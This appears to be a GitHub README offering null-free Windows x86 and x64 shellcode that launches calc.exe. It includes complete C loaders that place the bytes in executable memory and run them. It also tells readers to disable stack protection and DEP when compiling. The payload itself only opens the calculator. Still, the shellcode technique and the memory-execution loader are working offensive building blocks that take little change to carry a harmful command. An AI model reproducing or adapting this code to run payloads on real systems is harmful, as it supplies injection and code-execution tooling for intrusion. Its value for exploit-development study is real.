# WinShellcode

Windows(x32-x64) null-free shellcode to pop calc.exe


Feel free to contact if any question...












To run it successfully in Visual Studio, you’ll have to compile it with some protections disabled:


Security Check: Disabled (/GS-)


Data Execution Prevention (DEP): No


##########################################################
```
//testing: x64
//len: 265

#include <windows.h>
void main() {
    void* exec;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    // Shellcode
    unsigned char payload[] =
        "\x50\x53\x51\x52\x57\x56\x55\x54\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x41\x57\x48\x83\xec\x20\x48\x31\xdb\x65\x4c\x8b\x63\x60\x4d\x8b\x64\x24\x18\x49\x8b\x74\x24\x20\x48\xad\x48\x96\x48\xad\x4c\x8b\x78\x20\x4d\x31\xe4\x45\x8b\x67\x3c\x4d\x01\xfc\x4d\x31\xf6\x45\x8b\xb4\x24\x88\x00\x00\x00\x4d\x01\xfe\x4d\x31\xe4\x45\x8b\x66\x20\x4d\x01\xfc\xeb\x77\x48\x31\xff\x41\x8b\x3c\x9c\x4c\x01\xff\x48\xa7\x74\x09\x48\xff\xc3\x48\x83\xee\x08\xeb\xe9\x48\x31\xf6\x48\x31\xff\x41\x8b\x76\x24\x4c\x01\xfe\x66\x8b\x3c\x5e\x48\x31\xf6\x41\x8b\x76\x1c\x4c\x01\xfe\x4d\x31\xf6\x44\x8b\x34\xbe\x4d\x01\xfe\xeb\x14\x48\x31\xd2\x48\x83\xc2\x0a\x48\x83\xec\x20\x41\xff\xd6\x48\x83\xc4\x20\xeb\x38\xe8\x1d\x00\x00\x00\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79\x73\x74\x65\x6d\x33\x32\x5c\x63\x61\x6c\x63\x2e\x65\x78\x65\x00\x59\xeb\xc7\xe8\x08\x00\x00\x00\x57\x69\x6e\x45\x78\x65\x63\x00\x5e\xe9\x76\xff\xff\xff\x48\x83\xc4\x20\x41\x5f\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5c\x5d\x5e\x5f\x5a\x59\x5b\x58\xc3";
    unsigned int payload_len = 263;
    exec = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    RtlMoveMemory(exec, payload, payload_len);
    rv = VirtualProtect(exec, payload_len, PAGE_EXECUTE_READ, &oldprotect);
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
    WaitForSingleObject(th, -1);
}
```
############################################################
```
//testing: x32
//len: 193 byte

#include <stdio.h>

unsigned char sc[] = 	"\x50\x53\x51\x52\x57\x56\x55\x55\x89\xe5\x83\xec\x18\x31\xf6\x56\x68\x78\x65\x63\x00\x68\x57\x69\x6e\x45\x89\x65\xfc\x31\xf6\x64\x8b\x5e\x30\x8b\x5b\x0c\x8b\x5b\x14\x8b\x1b\x8b\x1b\x8b\x5b\x10\x89\x5d\xf8\x8b\x43\x3c\x01\xd8\x8b\x40\x78\x01\xd8\x8b\x48\x24\x01\xd9\x89\x4d\xf4\x8b\x78\x20\x01\xdf\x89\x7d\xf0\x8b\x50\x1c\x01\xda\x89\x55\xec\x8b\x50\x14\x31\xc0\x8b\x7d\xf0\x8b\x75\xfc\x31\xc9\xfc\x8b\x3c\x87\x01\xdf\x66\x83\xc1\x08\xf3\xa6\x74\x0a\x40\x39\xd0\x72\xe5\x83\xc4\x28\xeb\x3f\x8b\x4d\xf4\x8b\x55\xec\x66\x8b\x04\x41\x8b\x04\x82\x01\xd8\x31\xd2\x52\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x68\x6d\x33\x32\x5c\x68\x79\x73\x74\x65\x68\x77\x73\x5c\x53\x68\x69\x6e\x64\x6f\x68\x43\x3a\x5c\x57\x89\xe6\x6a\x0a\x56\xff\xd0\x83\xc4\x48\x5d\x5e\x5f\x5a\x59\x5b\x58\xc3";

int main()
{
	((void(*)())sc)();
	return 0;
}
```
##########################################################
